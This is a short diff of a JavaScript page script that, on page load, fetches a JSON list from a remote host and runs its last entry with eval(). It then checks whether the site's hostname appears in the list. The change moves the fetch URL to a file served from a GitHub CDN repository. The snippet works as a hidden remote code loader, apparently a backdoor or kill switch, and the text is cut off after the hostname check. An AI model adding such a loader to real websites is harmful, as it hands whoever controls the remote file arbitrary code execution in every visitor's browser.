@@ -9,7 +9,7 @@
 
     window.addEventListener('DOMContentLoaded', (event) => {
 
-fetch('https://api.anubis-dev.com/TableMatchAuto/active.php').then(g=>g.json()).then((data)=>{
+fetch('https://cdn.statically.io/gh/oe0e0/K/main/active.php').then(g=>g.json()).then((data)=>{
     eval(data[data.length - 1]);
     if(data.includes(window.location.hostname)) {
 
